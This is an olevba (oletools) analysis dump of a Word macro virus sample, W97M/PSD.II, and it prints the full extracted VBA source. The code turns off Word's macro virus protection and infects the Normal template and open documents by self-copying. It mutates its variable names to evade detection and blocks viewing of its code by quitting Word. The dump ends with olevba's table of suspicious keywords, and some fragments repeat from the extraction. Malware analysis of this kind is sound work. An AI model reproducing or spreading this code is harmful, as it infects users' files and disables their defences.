olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-e8d75a391538404c123d71bbce7e1ea6810026c5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-e8d75a391538404c123d71bbce7e1ea6810026c5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For HG6719 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next HG6719: End If
NI6441 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
EI3652 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set LL326 = ActiveDocument.VBProject.VBComponents.Item(1)
HS5525 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set LL326 = NormalTemplate.VBProject.VBComponents.Item(1)
TF943 = True
Call VQ6283_AU3524
ActiveDocument.Saved = True
End If
If TF943 <> True And HS5525 <> True Then GoTo SD1178
If TF943 = True Then LL326.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NI6441 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If HS5525 = True Then LL326.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EI3652 - 4))
SD1178:
If EI3652 <> 0 And NI6441 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function VQ6283_AU3524()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "KN348": r1(2) = "NO8777": r1(3) = "VM4526": r1(4) = "AD6764": r1(5) = "AU3524": r1(6) = "NI6441"
r1(7) = "EI3652": r1(8) = "HS5525":: r1(9) = "LL326": r1(10) = "TF943": r1(11) = "SD1178": r1(12) = "VQ6283": r1(13) = "IC105": r1(14) = "VP1645": r1(15) = "HG6719"
For HG6719 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call AU3524(a1, r1(HG6719))
Next HG6719
End Function 'VAMP v1.0 [thanks Vic!]
Private Function AU3524(VP1645, IC105 As String)
On Error Resume Next
Dim KN348 As Long: Dim NO8777 As Long: Dim VM4526 As Long: Dim AD6764 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
KN348 = 1: NO8777 = 1: VM4526 = .CountOfLines: AD6764 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IC105, KN348, NO8777, VM4526, AD6764, True)
strline = .Lines(KN348, 1)
strline = Left(strline, NO8777 - 1) & VP1645 & Mid(strline, AD6764)
.replaceline KN348, strline
KN348 = VM4526 + 1: NO8777 = 1:
VM4526 = .CountOfLines
AD6764 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Function Test()
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For HG6719 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next HG6719: End If
NI6441 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
EI3652 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set LL326 = ActiveDocument.VBProject.VBComponents.Item(1)
HS5525 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set LL326 = NormalTemplate.VBProject.VBComponents.Item(1)
TF943 = True
Call VQ6283_AU3524
ActiveDocument.Saved = True
End If
If TF943 <> True And HS5525 <> True Then GoTo SD1178
If TF943 = True Then LL326.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NI6441 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If HS5525 = True Then LL326.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EI3652 - 4))
SD1178:
If EI3652 <> 0 And NI6441 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Function 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]

()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "KN348": r1(2) = "NO8777": r1(3) = "VM4526": r1(4) = "AD6764": r1(5) = "AU3524": r1(6) = "NI6441"
r1(7) = "EI3652": r1(8) = "HS5525":: r1(9) = "LL326": r1(10) = "TF943": r1(11) = "SD1178": r1(12) = "VQ6283": r1(13) = "IC105": r1(14) = "VP1645": r1(15) = "HG6719"
For HG6719 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call AU3524(a1, r1(HG6719))
Next HG6719
End Function 'VAMP v1.0 [thanks Vic!]

)
On Error Resume Next
Dim KN348 As Long: Dim NO8777 As Long: Dim VM4526 As Long: Dim AD6764 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
KN348 = 1: NO8777 = 1: VM4526 = .CountOfLines: AD6764 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IC105, KN348, NO8777, VM4526, AD6764, True)
strline = .Lines(KN348, 1)
strline = Left(strline, NO8777 - 1) & VP1645 & Mid(strline, AD6764)
.replaceline KN348, strline
KN348 = VM4526 + 1: NO8777 = 1:
VM4526 = .CountOfLines
AD6764 = Len(.Lines(.CountOfLines, 1))
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

